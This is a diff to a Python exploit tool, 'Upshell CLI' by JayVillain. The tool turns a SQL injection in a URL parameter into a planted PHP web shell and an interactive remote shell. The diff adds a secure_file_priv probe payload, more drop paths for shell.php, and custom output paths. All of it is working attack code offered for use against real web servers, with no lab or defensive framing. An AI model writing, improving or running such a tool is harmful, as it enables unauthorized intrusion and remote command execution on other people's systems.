@@ -8,7 +8,6 @@ import time
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 from rich.console import Console
 from rich.prompt import Prompt
-from rich.table import Table
 from rich.panel import Panel
 from rich import box
 
@@ -25,10 +24,13 @@ if(isset($_FILES['file'])){
 }
 ?>'''
 
-UPLOAD_PATHS = [
+DEFAULT_UPLOAD_PATHS = [
     "/var/www/html/shell.php",
     "/tmp/shell.php",
     "/srv/http/shell.php",
+    "/var/tmp/shell.php",
+    "/dev/shm/shell.php",
+    "/home/www-data/shell.php",
     "C:/xampp/htdocs/shell.php",
 ]
 
@@ -51,8 +53,19 @@ def extract_param(url: str) -> str:
         raise ValueError("Target URL must contain at least one parameter")
     return list(qs.keys())[0]
 
-def try_upload_shell(url: str, param: str) -> str:
-    for path in UPLOAD_PATHS:
+def detect_secure_file_priv(url: str, param: str):
+    payload = "' UNION SELECT @@secure_file_priv-- -"
+    test_url = build_exploit_url(url, param, payload)
+    try:
+        r = requests.get(test_url, headers=HEADERS, timeout=10)
+        console.print(f"[blue][*] Response from @@secure_file_priv:[/] {r.text.strip()}")
+        return r.text.strip()
+    except Exception as e:
+        console.print(f"[red][!] Error checking secure_file_priv: {e}")
+        return None
+
+def try_upload_shell(url: str, param: str, upload_paths) -> str:
+    for path in upload_paths:
         payload = f"' UNION SELECT \"{WEB_SHELL}\" INTO OUTFILE '{path}'-- -"
         exploit_url = build_exploit_url(url, param, payload)
         try:
@@ -101,12 +114,22 @@ def shell_loop(shell_url: str):
 def main():
     parser = argparse.ArgumentParser(description="Upshell CLI - SQLi to Shell Exploiter by JayVillain")
     parser.add_argument("-u", "--url", help="Target URL with vulnerable parameter", required=True)
+    parser.add_argument("--custom-path", help="Custom OUTFILE path to try (in addition to default paths)", nargs='*')
     args = parser.parse_args()
 
     try:
         param = extract_param(args.url)
         console.print(Panel(f"[bold]Target:[/] {args.url}\n[bold]Param:[/] {param}", title="[blue]UpshellCLI Info[/blue]", box=box.DOUBLE))
-        shell_url = try_upload_shell(args.url, param)
+
+        priv_path = detect_secure_file_priv(args.url, param)
+        upload_paths = DEFAULT_UPLOAD_PATHS.copy()
+        if priv_path and os.path.isdir(priv_path):
+            guess = os.path.join(priv_path, "shell.php")
+            upload_paths.insert(0, guess)
+        if args.custom_path:
+            upload_paths.extend(args.custom_path)
+
+        shell_url = try_upload_shell(args.url, param, upload_paths)
         if shell_url:
             shell_loop(shell_url)
         else:
